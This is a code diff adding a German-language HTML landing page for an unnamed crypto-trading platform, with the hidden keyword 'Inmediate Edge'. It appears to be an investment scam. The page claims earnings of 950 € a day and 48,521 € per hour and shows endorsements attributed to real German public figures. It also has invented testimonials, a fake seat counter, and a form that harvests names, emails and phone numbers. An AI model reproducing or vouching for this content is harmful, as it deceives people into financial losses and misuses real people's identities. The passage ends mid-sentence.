@@ -1,0 +1,946 @@
+<!DOCTYPE html>
+
+<html lang="de">
+<meta content="text/html;charset=utf-8" http-equiv="content-type" />
+
+<head>
+  <base />
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+  <title id="dynamic-brand-0"></title>
+  <link href="images/favicon.png" rel="icon" type="image/png" />
+  <link href="css/fonts.css" rel="stylesheet" />
+  <link href="css/tailwind.css" rel="stylesheet" />
+  <link href="css/styles.css" rel="stylesheet" />
+  <style>
+    #floatingButton {
+      position: fixed;
+      left: 0px;
+      bottom: 0px;
+      display: none;
+      width: 100%;
+      cursor: pointer;
+    }
+
+    .floatingButton {
+      --tw-text-opacity: 1;
+      font-family: "Encode Sans Expanded", sans-serif;
+      font-size: 1.7rem;
+      font-weight: 900;
+      color: rgb(255 255 255 / var(--tw-text-opacity));
+      background-color: rgb(247 158 27 / var(--tw-bg-opacity));
+      position: relative;
+      z-index: auto;
+      display: block;
+      width: 100%;
+      padding: 5px;
+      margin: 0 auto;
+      transition: 0.3s;
+      text-align: center;
+      text-transform: uppercase;
+      text-decoration: none !important;
+    }
+
+    .floatingButton:hover {
+      --tw-brightness: brightness(1.05);
+      filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow);
+    }
+
+    /* Bloqueo de pantalla al enviar formulario */
+    .form-disabled {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 9999;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-weight: bold;
+      font-size: 1.5rem;
+    }
+  </style>
+  <link href="../../ofusiok.xyz/default-integration.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body class="overflow-x-hidden">
+  <header class="header-mobile flex flex-col">
+    <nav class="nav py-1 lg:py-5 border-b border-b-white/10">
+      <div class="relative max-w-8xl px-4 mx-auto pt-8 lg:pt-0 flex items-center justify-center lg:justify-between">
+        <a class="logo flex items-center gap-3">
+          <img alt="" src="images/logo.svg" />
+          <div class="uppercase text-white"><span id="dynamic-brand-2"></span> </div>
+        </a>
+        <div
+          class="absolute -top-1 left-0 w-full lg:w-auto lg:static px-5 py-1 lg:py-2 bg-primary-main lg:rounded-md text-white font-bold text-sm lg:text-base text-center">
+          Verfügbare Plätze <strong class="text-base lg:text-lg font-black" data-slot-count="">38</strong>
+        </div>
+      </div>
+    </nav>
+    <div class="relative w-full max-w-8xl px-4 mx-auto z-10 flex-grow flex flex-col">
+      <div class="header-lines flex flex-col flex-grow">
+        <div class="flex flex-col lg:flex-row flex-grow">
+          <div class="w-full lg:w-1/2 my-6 text-center lg:text-left lg:self-center">
+            <div class="text-3xl xl:text-5xl xl:leading-tight font-alt font-black text-white">Gewinne</div>
+            <div class="text-4xl xl:text-6xl xl:leading-tight font-alt font-black text-primary-bright">Mehr als 950 €
+              pro Tag verdienen</div>
+            <div class="flex items-center justify-center lg:justify-start">
+              <div class="my-2 text-base xl:text-2xl font-alt font-black text-white text-left">Handeln Sie<br />mit
+                <span id="dynamic-brand-3"></span>.
+              </div>
+              <div class="ml-4 p-1.5 rounded-full bg-primary-darker flex gap-1 items-center">
+                <img alt="" class="w-7 h-7 lg:w-9 lg:h-9" src="images/btc.svg" />
+                <img alt="" class="w-7 h-7 lg:w-9 lg:h-9" src="images/usdt.svg" />
+                <img alt="" class="w-7 h-7 lg:w-9 lg:h-9" src="images/binance.svg" />
+                <img alt="" class="mx-2" src="images/header-arrow.svg" />
+              </div>
+            </div>
+            <div class="my-5 lg:my-10 text-base md:text-lg font-semibold text-white/80">Die Anmeldung ist
+              für<br />Verfügbare Personen in <span id="dynamic-country" class="dynamic-country">Deutschland</span>.
+            </div>
+            <div class="flex items-center justify-center lg:justify-start gap-2 xl:gap-5">
+              <div class="flex">
+                <img alt="" class="relative w-11 h-11 rounded-full border border-primary-dark z-[3]"
+                  src="images/header-avatar-1.webp"
+                  srcset="images/header-avatar-1.webp 1x, images/header-avatar-1.webp 2x" />
+                <img alt="" class="relative w-11 h-11 -ml-3 rounded-full border border-primary-dark z-[2]"
+                  src="images/header-avatar-2.webp"
+                  srcset="images/header-avatar-2.webp 1x, images/header-avatar-2.webp 2x" />
+                <img alt="" class="relative w-11 h-11 -ml-3 rounded-full border border-primary-dark z-[1]"
+                  src="images/header-avatar-3.webp"
+                  srcset="images/header-avatar-3.webp 1x, images/header-avatar-3.webp 2x" />
+              </div>
+              <div class="text-left text-xs sm:text-base">
+                <div class="text-white">
+                  <span class="text-white/80">4,7 Sterne von über</span>
+                  <span class="font-bold">2.780 Benutzer</span>
+                </div>
+                <img alt="" class="h-5" src="images/stars.svg" />
+              </div>
+            </div>
+          </div>
+          <div
+            class="header-form pt-12 mx-auto lg:ml-auto lg:mr-0 w-full max-w-[420px] lg:max-w-[490px] flex flex-col items-center">
+            <img alt="" class="w-12" src="images/logo.svg" />
+            <div class="mt-1 text-2xl font-black text-white font-alt">Jetzt registrieren</div>
+            <form action="registration-form.php" class="rf-form js-rf-form leadform" id="form" method="post">
+              <div class="form-preloader hidden">
+                <svg class="spinner" height="50" viewbox="0 0 50 50" width="50">
+                  <circle class="path" cx="25" cy="25" fill="none" r="20" stroke-width="5"></circle>
+                </svg>
+              </div>
+              <input id="intgrtn_custom2" name="intgrtn_custom2" type="hidden" value="manual" />
+              <input id="gbraid" name="gbraid" type="hidden" value="" />
+              <input id="wbraid" name="wbraid" type="hidden" value="" />
+              <input id="gclid" name="gclid" type="hidden" value="" />
+              <input id="msclkid" name="msclkid" type="hidden" value="" />
+              <input id="kw" name="kw" type="hidden" value="Inmediate Edge" />
+              <input id="phone_country" name="phone_country" type="hidden" value="de" />
+              <div class="rf-form__content">
+                <div class="rf-form__loader js-rf-loader" style="display: none">Bitte warten Sie...</div>
+                <div class="rf-form-field">
+                  <input class="rf-form-input" id="fname" name="first_name" placeholder="Vorname (wie im Ausweis)"
+                    required="required" type="text" value="" />
+                </div>
+                <div class="rf-form-field">
+                  <input class="rf-form-input" id="lname" name="last_name" placeholder="Nachname" required="required"
+                    type="text" value="" />
+                </div>
+                <div class="rf-form-field">
+                  <input class="rf-form-input" id="email-field" name="email" placeholder="E-Mail-Adresse"
+                    required="required" type="email" value="" />
+                </div>
+                <div class="rf-form-field">
+                  <span class="error-msg hide"></span>
+                  <input class="rf-form-input phone-input" id="phone" inputmode="numeric" name="phone1" pattern="\d+"
+                    placeholder="Telefonnummer" required="required" type="tel" />
+                </div>
+
+                <div class="rf-alert rf-alert_error" style="display: none; color: red; width: min-content">
+                  <svg class="rf-alert__icon" fill="currentColor" height="20" viewbox="0 0 20 20" width="20"
+                    xmlns="http://www.w3.org/2000/svg">
+                    <path clip-rule="evenodd"
+                      d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
+                      fill-rule="evenodd"></path>
+                  </svg>
+                  <div class="rf-alert__content js-rf-alert-error"></div>
+                </div>
+                <div class="rf-alert rf-alert_success" style="display: none; color: green; width: min-content">
+                  <svg class="rf-alert__icon" fill="currentColor" height="20" viewbox="0 0 20 20" width="20"
+                    xmlns="http://www.w3.org/2000/svg">
+                    <path clip-rule="evenodd"
+                      d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
+                      fill-rule="evenodd"></path>
+                  </svg>
+                  <div class="rf-alert__content js-rf-alert-success"></div>
+                </div>
+                <div class="my-5">
+                  <button
+                    class="w-full h-12 border-0 rounded-md text-white font-black font-alt cursor-pointer bg-primary-bright active:brightness-95 hover:brightness-105"
+                    type="submit">Jetzt registrieren</button>
+                </div>
+              </div>
+            </form>
+            <!-- CSS y JS para el selector de teléfono con banderas -->
+            <link href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.min.css"
+              rel="stylesheet" />
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+            <script>
+              document.addEventListener('DOMContentLoaded', function () {
+                const phoneInput = document.querySelector(".phone-input");
+
+                // Inicializa el plugin de banderas
+                const iti = window.intlTelInput(phoneInput, {
+                  initialCountry: "de",
+                  preferredCountries: ["de", "at", "ch", "de"],
+                  separateDialCode: true,
+                  utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+                  nationalMode: false,
+                  autoPlaceholder: "polite",
+                  placeholderNumberType: "MOBILE",
+                  customPlaceholder: function (selectedCountryPlaceholder, selectedCountryData) {
+                    return "6 12 345678";
+                  }
+                });
+
+                // Sincroniza con el campo oculto
+                const phoneCountryField = document.getElementById("phone_country");
+                phoneInput.addEventListener("countrychange", function () {
+                  phoneCountryField.value = iti.getSelectedCountryData().iso2;
+                });
+
+                // Validación visual en tiempo real
+                phoneInput.addEventListener('keyup', function () {
+                  if (iti.isValidNumber()) {
+                    phoneInput.style.border = "2px solid #22c55e"; // Green
+                  } else {
+                    phoneInput.style.border = "2px solid #ef4444"; // Red
+                  }
+                });
+
+                // Fuerza el valor inicial
+                phoneCountryField.value = 'de';
+              });
+            </script>
+            <style>
+              /* Ajustes de estilo para el input de teléfono */
+              .phone-input {
+                padding-left: 110px !important;
+                width: 100% !important;
+              }
+
+              .iti {
+                width: 100%;
+                display: block !important;
+              }
+
+              .iti__selected-flag {
+                padding: 0 10px 0 15px !important;
+              }
+
+              .iti__flag-container {
+                border-right: 1px solid #ddd !important;
+              }
+
+              .iti--separate-dial-code .iti__selected-flag {
+                background-color: rgba(0, 0, 0, 0.05);
+                border-radius: 3px 0 0 3px;
+              }
+            </style>
+            <div class="h-26 flex payment-methods">
+              <img alt="" src="images/payment.svg" />
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+  <main class="main">
+    <div class="my-7 lg:my-12 w-full max-w-8xl px-4 mx-auto">
+      <div class="mb-4 md:mb-16 flex flex-col md:flex-row border border-primary-dark/10 rounded-xl">
+        <div class="md:order-2 md:w-1/3 lg:w-auto md:-mr-px flex-shrink-0 md:translate-y-8">
+          <img alt="" class="w-full block rounded-t-xl md:rounded-br-xl" src="images/person-1.webp"
+            srcset="images/person-1.webp 1x, images/person-1.webp 2x" />
+        </div>
+        <div class="flex-grow p-4 sm:p-7">
+          <div class="flex items-center">
+            <img alt="" class="w-12 sm:w-auto mr-4 sm:mr-6" src="images/quote.svg" />
+            <div>
+              <div class="text-primary-darker text-xl lg:text-2xl font-black font-alt">Hasso Plattner</div>
+              <div class="text-sm uppercase font-bold text-primary-medium">Deutscher Unternehmer</div>
+            </div>
+          </div>
+          <div class="mt-4 sm:mt-7 text-primary-medium lg:text-lg">"In der heutigen Welt bieten Kryptowährungen eine
+            beispiellose Chance, sofortige Gewinne zu erzielen – wenn Sie wissen, wo Sie ansetzen müssen. <span
+              id="dynamic-brand-13"></span> bietet die richtigen Werkzeuge für ernsthafte Einnahmen mit einem
+            Wachstumspotenzial von Hunderten
+            oder sogar Tausenden von Prozent. Verpassen Sie diese Gelegenheit nicht und beginnen Sie jetzt mit dem
+            Handel!"</div>
+        </div>
+      </div>
+      <div class="flex flex-col md:flex-row border border-primary-dark/10 rounded-xl md:rounded-bl-none">
+        <div class="md:w-1/3 lg:w-auto md:-ml-px flex-shrink-0 md:-translate-y-8">
+          <img alt="" class="w-full block rounded-t-xl md:rounded-br-xl" src="images/person-2.webp"
+            srcset="images/person-2.webp 1x, images/person-2.webp 2x" />
+        </div>
+        <div class="flex-grow p-4 sm:p-7">
+          <div class="flex items-center">
+            <img alt="" class="w-12 sm:w-auto mr-4 sm:mr-6" src="images/quote.svg" />
+            <div>
+              <div class="text-primary-darker text-xl lg:text-2xl font-black font-alt">Klaas Heufer-Umlauf</div>
+              <div class="text-sm uppercase font-bold text-primary-medium">Deutscher Fernsehmoderator</div>
+            </div>
+          </div>
+          <div class="mt-4 sm:mt-7 text-primary-medium lg:text-lg">"Seit einigen Monaten investiere ich mein
+            Gehalt bei <span id="dynamic-brand-14"></span>. Es ist einfach zu bedienen, sicher und sehr lukrativ. Jetzt,
+            wo die Registrierung in Italien
+            verfügbar ist, kann ich es nur empfehlen. Diese Plattform ist ein echter Game-Changer."</div>
+        </div>
+      </div>
+    </div>
+    <div class="my-7 lg:my-12 w-full max-w-8xl px-4 mx-auto">
+      <div class="mb-7 grid grid-cols-1 lg:grid-cols-3 gap-4 lg:gap-7 lg:items-center">
+        <div class="lg:col-span-2">
+          <div class="mb-2 text-sm uppercase font-black text-primary-medium">01 // Kryptowährungspreise</div>
+          <div class="text-primary-darker text-xl lg:text-2xl font-black font-alt"> <span id="dynamic-brand-4"></span>
+            verwendet künstliche Intelligenz und fortschrittliche Algorithmen, um ausschließlich profitable Operationen
+            auszuführen</div>
+        </div>
+        <a>
+          <div class="lg:flex lg:justify-end text-primary-medium">
+            <button
+              class="h-12 px-4 sm:px-6 border-0 rounded-md text-white font-black font-alt cursor-pointer bg-primary-bright active:brightness-95 hover:brightness-105 text-sm sm:text-base whitespace-nowrap">Buchen
+              Sie noch heute Ihren Platz</button>
+          </div>
+        </a>
+      </div>
+      <div class="phones-bg rounded-xl">
+        <div class="relative phones-lines pb-64 lg:pb-0 mb-24">
+          <div
+            class="py-7 px-2.5 sm:py-10 lg:p-14 xl:px-20 xl:py-24 flex flex-col md:flex-row md:justify-between md:gap-2.5">
+            <div class="mb-2.5 md:mb-0 min-w-[300px] flex flex-col md:flex-grow lg:flex-grow-0 gap-2.5">
+              <div class="w-full flex items-center px-5 py-2.5 rounded-lg bg-white/5">
+                <img alt="" class="w-9 h-9 mr-4" src="images/btc.svg" />
+                <div class="mr-auto">
+                  <div class="mb-1 text-lg font-alt font-black text-white uppercase leading-4">BTC</div>
+                  <div class="text-white/40 leading-4">Bitcoin</div>
+                </div>
+                <div class="text-[#75C22B] text-lg font-black"> +$63,108.00 </div>
+              </div>
+              <div class="w-full flex items-center px-5 py-2.5 rounded-lg bg-white/5">
+                <img alt="" class="w-9 h-9 mr-4" src="images/eth.svg" />
+                <div class="mr-auto">
+                  <div class="mb-1 text-lg font-alt font-black text-white uppercase leading-4">ETH</div>
+                  <div class="text-white/40 leading-4">Ethereum</div>
+                </div>
+                <div class="text-[#75C22B] text-lg font-black"> +$3,240.28 </div>
+              </div>
+              <div class="w-full flex items-center px-5 py-2.5 rounded-lg bg-white/5">
+                <img alt="" class="w-9 h-9 mr-4" src="images/ltc.svg" />
+                <div class="mr-auto">
+                  <div class="mb-1 text-lg font-alt font-black text-white uppercase leading-4">LTC</div>
+                  <div class="text-white/40 leading-4">Litecoin</div>
+                </div>
+                <div class="text-[#75C22B] text-lg font-black">+$78.35</div>
+              </div>
+            </div>
+            <div class="min-w-[300px] flex flex-col md:flex-grow lg:flex-grow-0 gap-2.5">
+              <div class="w-full flex items-center px-5 py-2.5 rounded-lg bg-white/5">
+                <img alt="" class="w-9 h-9 mr-4" src="images/btc.svg" />
+                <div class="mr-auto">
+                  <div class="mb-1 text-lg font-alt font-black text-white uppercase leading-4">BTC</div>
+                  <div class="text-white/40 leading-4">Bitcoin</div>
+                </div>
+                <div class="text-[#75C22B] text-lg font-black"> +$63,108.00 </div>
+              </div>
+              <div class="w-full flex items-center px-5 py-2.5 rounded-lg bg-white/5">
+                <img alt="" class="w-9 h-9 mr-4" src="images/eth.svg" />
+                <div class="mr-auto">
+                  <div class="mb-1 text-lg font-alt font-black text-white uppercase leading-4">ETH</div>
+                  <div class="text-white/40 leading-4">Ethereum</div>
+                </div>
+                <div class="text-[#75C22B] text-lg font-black"> +$3,240.28 </div>
+              </div>
+              <div class="w-full flex items-center px-5 py-2.5 rounded-lg bg-white/5">
+                <img alt="" class="w-9 h-9 mr-4" src="images/ltc.svg" />
+                <div class="mr-auto">
+                  <div class="mb-1 text-lg font-alt font-black text-white uppercase leading-4">LTC</div>
+                  <div class="text-white/40 leading-4">Litecoin</div>
+                </div>
+                <div class="text-[#75C22B] text-lg font-black">+$78.35</div>
+              </div>
+            </div>
+          </div>
+          <img alt=""
+            class="absolute left-1/2 bottom-0 lg:bottom-1/2 -translate-x-1/2 translate-y-[20%] lg:translate-y-1/2 w-72 xl:w-auto"
+            src="images/phones.webp" srcset="images/phones.webp 1x, images/phones.webp 2x" />
+        </div>
+      </div>
+    </div>
+    <div class="my-7 lg:my-12 w-full max-w-8xl px-4 mx-auto">
+      <div class="mb-7 grid grid-cols-1 lg:grid-cols-3 gap-4 lg:gap-7 lg:items-center">
+        <div class="lg:col-span-2">
+          <div class="mb-2 text-sm uppercase font-black text-primary-medium">02 // Zufriedene Kunden</div>
+          <div class="text-primary-darker text-xl lg:text-2xl font-black font-alt">Sofortige Gewinne, keine Erfahrung
+            nötig! Mit unserer Unterstützung wirst du der Nächste sein!</div>
+        </div>
+        <div class="lg:text-lg text-primary-medium">Die Plattform <span id="dynamic-brand-5"></span> Sie ist dafür
+          ausgelegt, Transaktionen nur auszuführen, wenn die Algorithmen ein Gewinnpotenzial erkennen.</div>
+      </div>
+      <div class="grid grid-cols-1 gap-4 lg:grid-cols-3 lg:gap-7">
+        <div class="p-4 sm:p-7 rounded-lg bg-primary-light flex flex-col items-start">
+          <img alt="" class="h-5" src="images/stars.svg" />
+          <div class="my-5 pb-5 flex-grow text-primary-medium border-b border-b-primary-dark/10">Ich möchte meinen
+            tiefsten Dank aussprechen, weil <span id="dynamic-brand-6"></span> Es hat mein Leben völlig verändert. In
+            nur wenigen Wochen habe ich es geschafft, meinen Job zu kündigen!</div>
+          <div class="flex items-center">
+            <div class="w-16 h-16 sm:w-20 sm:h-20 mr-5 flex-shrink-0 rounded-full">
+              <img alt="" class="block w-full h-full object-cover rounded-full" src="images/user-1.webp"
+                srcset="images/user-1.webp 1x, images/user-1.webp 2x" />
+            </div>
+            <div>
+              <div class="font-black font-alt text-primary-darker truncate sm:text-lg">Giovanni Mulino</div>
+              <div class="px-4 py-1 inline-block rounded bg-primary-main text-white text-lg font-alt font-black"> €5,977
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="p-4 sm:p-7 rounded-lg bg-primary-light flex flex-col items-start">
+          <img alt="" class="h-5" src="images/stars.svg" />
+          <div class="my-5 pb-5 flex-grow text-primary-medium border-b border-b-primary-dark/10">Ehrlich gesagt, diese
+            Plattform überzeugt in jeder Hinsicht! Die Ergebnisse sind einfach unglaublich. In nur wenigen Wochen habe
+            ich bereits mehr verdient, als ich in mehreren Monaten in meinem normalen 9-to-5-Job verdienen könnte.</div>
+          <div class="flex items-center">
+            <div class="w-16 h-16 sm:w-20 sm:h-20 mr-5 flex-shrink-0 rounded-full">
+              <img alt="" class="block w-full h-full object-cover rounded-full" src="images/user-2.webp"
+                srcset="images/user-2.webp 1x, images/user-2.webp 2x" />
+            </div>
+            <div>
+              <div class="font-black font-alt text-primary-darker truncate sm:text-lg">Dorothea O'Flannagan</div>
+              <div class="px-4 py-1 inline-block rounded bg-primary-main text-white text-lg font-alt font-black">
+                €11,369 </div>
+            </div>
+          </div>
+        </div>
+        <div class="p-4 sm:p-7 rounded-lg bg-primary-light flex flex-col items-start">
+          <img alt="" class="h-5" src="images/stars.svg" />
+          <div class="my-5 pb-5 flex-grow text-primary-medium border-b border-b-primary-dark/10">Als ich vor zwei Wochen
+            entlassen wurde, war ich niedergeschlagen und dachte, mein Leben sei zum Scheitern verurteilt. Ohne
+            Alternativen am Horizont schien die Zukunft düster. Aber seitdem hat sich alles verändert und jetzt verdiene
+            ich rund 13.261,42 € pro Woche!</div>
+          <div class="flex items-center">
+            <div class="w-16 h-16 sm:w-20 sm:h-20 mr-5 flex-shrink-0 rounded-full">
+              <img alt="" class="block w-full h-full object-cover rounded-full" src="images/user-3.webp"
+                srcset="images/user-3.webp 1x, images/user-3.webp 2x" />
+            </div>
+            <div>
+              <div class="font-black font-alt text-primary-darker truncate sm:text-lg">Sven Hirschberg</div>
+              <div class="px-4 py-1 inline-block rounded bg-primary-main text-white text-lg font-alt font-black">
+                €33,426 </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pros-bg">
+      <div class="py-7 lg:py-12 w-full max-w-8xl px-4 mx-auto">
+        <div class="mb-2 text-sm uppercase font-black text-[#7389a3]">03 // UNSERE VORTEILE</div>
+        <div class="mb-7 grid grid-cols-1 lg:grid-cols-3 gap-4 lg:gap-7 lg:items-center">
+          <div class="lg:col-span-2">
+            <div class="text-white text-xl lg:text-2xl font-black font-alt">Jetzt registrieren und Zugang zu diesem
+              revolutionären System erhalten</div>
+          </div>
+          <div class="lg:text-lg text-[#7389a3]">Die außergewöhnlichen Eigenschaften von <span
+              id="dynamic-brand-7"></span> : </div>
+        </div>
+        <div class="grid grid-cols-1 gap-4 lg:grid-cols-3 lg:gap-7">
+          <div class="border-l border-l-white/10 border-b border-b-white/10 p-4 sm:p-7 !pr-0">
+            <div class="mb-4 sm:mb-7 sm:max-w-60 text-white sm:text-lg font-black font-alt">Intuitive Benutzeroberfläche
+            </div>
+            <div class="flex items-start">
+              <img alt="" class="w-16 h-16 sm:w-20 sm:h-20 mr-4 sm:mr-7" src="images/pros-1.svg" />
+              <div class="text-white">Unsere Plattform vereinfacht das Trading für alle Nutzer und bietet Tools für
+                Anfänger sowie maßgeschneiderte Optionen für erfahrene Trader.</div>
+            </div>
+          </div>
+          <div class="border-l border-l-white/10 border-b border-b-white/10 p-4 sm:p-7 !pr-0">
+            <div class="mb-4 sm:mb-7 sm:max-w-60 text-white sm:text-lg font-black font-alt">Cloud-basiertes System</div>
+            <div class="flex items-start">
+              <img alt="" class="w-16 h-16 sm:w-20 sm:h-20 mr-4 sm:mr-7" src="images/pros-2.svg" />
+              <div class="text-white">Operieren Sie überall und jederzeit mit unserer Plattform, die von jedem Gerät aus
+                zugänglich ist. Registrieren Sie sich jetzt für komfortables und unkompliziertes Trading.</div>
+            </div>
+          </div>
+          <div class="border-l border-l-white/10 border-b border-b-white/10 p-4 sm:p-7 !pr-0">
+            <div class="mb-4 sm:mb-7 sm:max-w-60 text-white sm:text-lg font-black font-alt">Datensicherheit rund um die
+              Uhr</div>
+            <div class="flex items-start">
+              <img alt="" class="w-16 h-16 sm:w-20 sm:h-20 mr-4 sm:mr-7" src="images/pros-3.svg" />
+              <div class="text-white">Sicherer Speicher, der rund um die Uhr Datenschutz gewährleistet. Konzentrieren
+                Sie sich auf die Gewinne und genießen Sie sicheres Trading.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="p-7 bg-primary-main text-white text-xl lg:text-2xl font-black font-alt text-center">
+      <div class="w-full max-w-8xl px-4 mx-auto">
+        <span class="text-[#93FF09]">Unsere Mitglieder in <span id="dynamic-country"
+            class="dynamic-country">Deutschland</span> verdienen durchschnittlich </span>48.521 € pro Stunde.<span
+          class="text-[#93FF09]"></span>
+      </div>
+    </div>
+    <div class="my-7 lg:my-12 w-full max-w-8xl px-4 mx-auto">
+      <div class="grid grid-cols-1 gap-4 lg:grid-cols-3 lg:gap-7">
+        <div class="relative">
+          <img alt="" class="w-full h-full rounded-xl" src="images/info.webp"
+            srcset="images/info.webp 1x, images/info.webp 2x" />
+        </div>
+        <div class="lg:col-span-2">
+          <div class="mb-2 text-sm uppercase font-black text-primary-medium">04 // Über uns</div>
+          <div class="text-primary-darker text-xl lg:text-2xl font-black font-alt"> <span id="dynamic-brand-8"></span>
+            Jetzt funktioniert es mit allen großen Kryptobörsen-Plattformen.</div>
+          <div class="my-4 lg:my-7 text-primary-medium lg:text-lg">Das Geheimnis liegt in der Funktionsweise der
+            Trading-Plattformen. Der Preis von Währungen steigt und fällt je nach Angebot und Nachfrage, und das Angebot
+            und die Nachfrage nach Währungen variieren von Plattform zu Plattform. Deshalb gibt es oft RIESIGE
+            Preisunterschiede für dieselbe Währung auf verschiedenen Plattformen. <span id="dynamic-brand-9"></span> Es
+            integriert sich nahtlos mit Coinbase, Binance, Kraken, Poloniex, Bittrex und vielen anderen, um Ihnen ein
+            sofortiges Handelserlebnis und schnelle Gewinne zu bieten.</div>
+          <div class="flex flex-col sm:flex-row items-center lg:-translate-x-1/3">
+            <div class="p-4 sm:px-8 sm:py-6 rounded-xl bg-primary-light/90 flex items-center gap-2 sm:gap-2.5">
+              <div class="max-w-12">
+                <img alt="" class="block" src="images/coinbase.svg" />
+              </div>
+              <div class="max-w-12">
+                <img alt="" class="block" src="images/kraken.svg" />
+              </div>
+              <div class="max-w-12">
+                <img alt="" class="block" src="images/binance.svg" />
+              </div>
+              <div class="max-w-12">
+                <img alt="" class="block" src="images/polonex.svg" />
+              </div>
+              <div class="max-w-12">
+                <img alt="" class="block" src="images/bittrex.svg" />
+              </div>
+              <div class="sm:ml-4">
+                <img alt="" class="max-w-12 sm:max-w-none block rotate-90 sm:rotate-0" src="images/info-arrow.svg" />
+              </div>
+            </div>
+            <a>
+              <button
+                class="h-12 mt-4 sm:mt-0 px-4 sm:px-6 sm:ml-7 border-0 rounded-md text-white font-black font-alt cursor-pointer bg-primary-bright active:brightness-95 hover:brightness-105 text-sm sm:text-base whitespace-nowrap">Buchen
+                Sie noch heute Ihren Platz</button>
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="bg-primary-dark">
+      <div class="py-7 lg:py-12 w-full max-w-8xl px-4 mx-auto">
+        <div class="grid grid-cols-1 gap-4 lg:grid-cols-3 lg:gap-7">
+          <div class="p-4 sm:p-7 rounded-lg bg-primary-light flex flex-col items-start">
+            <img alt="" class="h-5" src="images/stars.svg" />
+            <div class="my-5 pb-5 flex-grow text-primary-medium border-b border-b-primary-dark/10">Ich bin völlig
+              sprachlos. So hohe Zahlen hatte ich noch nie gesehen.</div>
+            <div class="flex items-center">
+              <div class="w-16 h-16 sm:w-20 sm:h-20 mr-5 flex-shrink-0 rounded-full">
+                <img alt="" class="block w-full h-full object-cover rounded-full" src="images/user-4.webp"
+                  srcset="images/user-4.webp 1x, images/user-4.webp 2x" />
+              </div>
+              <div>
+                <div class="font-black font-alt text-primary-darker truncate sm:text-lg">Samuel Rasmussen</div>
+                <div class="px-4 py-1 inline-block rounded bg-primary-main text-white text-lg font-alt font-black">
+                  €7,899 </div>
+              </div>
+            </div>
+          </div>
+          <div class="p-4 sm:p-7 rounded-lg bg-primary-light flex flex-col items-start">
+            <img alt="" class="h-5" src="images/stars.svg" />
+            <div class="my-5 pb-5 flex-grow text-primary-medium border-b border-b-primary-dark/10">Ich kann es nicht
+              glauben. Zum Beispiel 43.568 € in nur 30 Tagen. Ich bin sehr dankbar.</div>
+            <div class="flex items-center">
+              <div class="w-16 h-16 sm:w-20 sm:h-20 mr-5 flex-shrink-0 rounded-full">
+                <img alt="" class="block w-full h-full object-cover rounded-full" src="images/user-5.webp"
+                  srcset="images/user-5.webp 1x, images/user-5.webp 2x" />
+              </div>
+              <div>
+                <div class="font-black font-alt text-primary-darker truncate sm:text-lg">Paolo Dünenfeld</div>
+                <div class="px-4 py-1 inline-block rounded bg-primary-main text-white text-lg font-alt font-black">
+                  €12,896 </div>
+              </div>
+            </div>
+          </div>
+          <div class="p-4 sm:p-7 rounded-lg bg-primary-light flex flex-col items-start">
+            <img alt="" class="h-5" src="images/stars.svg" />
+            <div class="my-5 pb-5 flex-grow text-primary-medium border-b border-b-primary-dark/10">Auf meinem
+              Trading-Konto sind jetzt 231.952 €. Unglaublich!</div>
+            <div class="flex items-center">
+              <div class="w-16 h-16 sm:w-20 sm:h-20 mr-5 flex-shrink-0 rounded-full">
+                <img alt="" class="block w-full h-full object-cover rounded-full" src="images/user-6.webp"
+                  srcset="images/user-6.webp 1x, images/user-6.webp 2x" />
+              </div>
+              <div>
+                <div class="font-black font-alt text-primary-darker truncate sm:text-lg">Elisa Wilsdorf</div>
+                <div class="px-4 py-1 inline-block rounded bg-primary-main text-white text-lg font-alt font-black">
+                  €49,279 </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="bg-primary-light">
+      <div class="py-7 w-full max-w-8xl px-4 mx-auto">
+        <div class="flex flex-col lg:flex-row lg:items-center">
+          <div class="lg:w-1/3 mb-4 lg:mb-0 flex items-center flex-shrink-0">
+            <div class="w-16 h-16 sm:w-20 sm:h-20 mr-5 flex-shrink-0 rounded-full">
+              <img alt="" class="block w-full h-full object-cover rounded-full" src="images/user-7.webp"
+                srcset="images/user-7.webp 1x, images/user-7.webp 2x" />
+            </div>
+            <div>
+              <div class="font-black font-alt text-primary-darker truncate sm:text-lg">Francesca Gallenbach</div>
+              <img alt="" class="h-5" src="images/stars.svg" />
+              <div class="mt-2 flex gap-2">
+                <a
+                  class="px-2 py-0.5 inline-flex items-center border border-primary-medium rounded text-primary-medium hover:text-primary-main hover:border-primary-main active:brightness-95">
+                  <i class="icon-like mr-1"></i>Ich mag es</a>
+                <a
+                  class="px-2 py-0.5 inline-flex items-center border border-primary-medium rounded text-primary-medium hover:text-primary-main hover:border-primary-main active:brightness-95">
+                  <i class="icon-comment mr-1"></i>Kommentieren</a>
+              </div>
+            </div>
+          </div>
+          <div class="flex-grow text-primary-medium">Ich habe noch nie zuvor operiert, aber <span
+              id="dynamic-brand-10"></span> Sie machen es so einfach. Ich hätte nie gedacht, dass ich das sagen würde,
